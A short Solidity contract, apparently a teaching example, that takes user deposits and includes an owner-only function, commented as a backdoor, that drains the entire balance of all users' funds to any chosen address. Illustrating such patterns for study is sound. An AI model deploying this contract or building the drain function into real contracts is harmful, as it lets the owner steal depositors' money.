// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract BackdoorAttack {
    address public owner;
    mapping(address => uint256) public balances;

    constructor() {
        owner = msg.sender;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // ❌ Backdoor: only the owner can drain all user funds
    function backdoorDrain(address to) public {
        require(msg.sender == owner, "Not authorized");
        payable(to).transfer(address(this).balance);
    }
}
